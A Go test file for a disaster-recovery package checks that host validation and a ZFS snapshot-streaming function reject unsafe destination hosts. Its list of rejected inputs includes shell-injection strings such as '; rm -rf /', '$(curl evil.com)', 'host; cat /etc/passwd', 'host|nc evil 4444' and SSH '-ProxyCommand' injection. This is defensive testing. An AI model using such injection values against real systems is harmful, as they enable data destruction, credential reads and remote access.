package dr

import (
	"context"
	"strings"
	"testing"
)

func TestValidateHost(t *testing.T) {
	validHosts := []string{
		"",
		"localhost",
		"dr-1",
		"192.168.1.100",
		"10.0.0.1",
		"host.example.com",
		"db-server-01.prod.example.org",
		"::1",
		"fe80::1",
	}
	for _, host := range validHosts {
		if err := validateHost(host); err != nil {
			t.Errorf("validateHost(%q) = %v; want nil", host, err)
		}
	}

	invalidHosts := []string{
		"; rm -rf /",
		"$(curl evil.com)",
		"host; cat /etc/passwd",
		"host|nc evil 4444",
		"host && wget evil",
		"host`whoami`",
		"host$(id)",
		"-o ProxyCommand=evil",
		"-o",
		"-ProxyCommand=evil",
		"host\nnewline",
		"host\twith\ttabs",
		"host&background",
		"host>redirect",
		"host<redirect",
		"host{brace}",
		"host[bracket",
		"host(unparen",
		"host)closes",
	}
	for _, host := range invalidHosts {
		if err := validateHost(host); err == nil {
			t.Errorf("validateHost(%q): expected error for unsafe host, got nil", host)
		}
	}
}

func TestStreamZFSDeltaRejectsMaliciousDestHost(t *testing.T) {
	ctx := context.Background()
	runner := &fakeRunner{}

	malicious := "dr-1; rm -rf /"
	err := streamZFSDelta(ctx, runner, "tank/dr/vm-disk0", "vm-disk0", "snap-end", "snap-base", malicious, "tank/vms/vm-disk0")
	if err == nil {
		t.Fatal("expected error for malicious destHost, got nil")
	}
	if !strings.Contains(err.Error(), "shell metacharacters") {
		t.Errorf("error should mention shell metacharacters, got: %v", err)
	}
	if len(runner.calls) != 0 {
		t.Errorf("no zfs command should have run, but got %d calls: %v", len(runner.calls), runner.calls)
	}
}

func TestStreamZFSDeltaRejectsSSHArgumentInjection(t *testing.T) {
	ctx := context.Background()
	runner := &fakeRunner{}

	malicious := "-ProxyCommand=evil"
	err := streamZFSDelta(ctx, runner, "tank/dr/vm-disk0", "vm-disk0", "snap-end", "snap-base", malicious, "tank/vms/vm-disk0")
	if err == nil {
		t.Fatal("expected error for SSH option injection host, got nil")
	}
	if !strings.Contains(err.Error(), "must not start with a dash") {
		t.Errorf("error should mention dash prefix, got: %v", err)
	}
	if len(runner.calls) != 0 {
		t.Errorf("no zfs command should have run, but got %d calls: %v", len(runner.calls), runner.calls)
	}
}

func TestStreamZFSDeltaRemoteHost(t *testing.T) {
	ctx := context.Background()
	runner := &fakeRunner{}

	err := streamZFSDelta(ctx, runner, "tank/dr/vm-disk0", "vm-disk0", "snap-end", "snap-base", "dr-1.example.com", "tank/vms/vm-disk0")
	if err != nil {
		t.Fatalf("streamZFSDelta with valid host failed: %v", err)
	}
	if len(runner.calls) != 1 {
		t.Fatalf("expected 1 zfs call, got %d: %v", len(runner.calls), runner.calls)
	}
	cmd := runner.calls[0].joined()
	if !strings.Contains(cmd, "zfs send -i @snap-base tank/dr/vm-disk0@snap-end") {
		t.Errorf("send command missing or wrong: %s", cmd)
	}
	if !strings.Contains(cmd, "ssh dr-1.example.com zfs recv -F tank/vms/vm-disk0") {
		t.Errorf("ssh recv command missing or wrong: %s", cmd)
	}
}

func TestStreamZFSDeltaLocalhost(t *testing.T) {
	ctx := context.Background()
	runner := &fakeRunner{}

	err := streamZFSDelta(ctx, runner, "tank/dr/vm-disk0", "vm-disk0", "snap-end", "snap-base", "localhost", "tank/vms/vm-disk0")
	if err != nil {
		t.Fatalf("streamZFSDelta with localhost failed: %v", err)
	}
	call := runner.calls[0].joined()
	if strings.Contains(call, "ssh") {
		t.Errorf("ssh should not be used for localhost: %s", call)
	}
	if !strings.Contains(call, "zfs recv -F tank/vms/vm-disk0") {
		t.Errorf("local recv command missing: %s", call)
	}
}
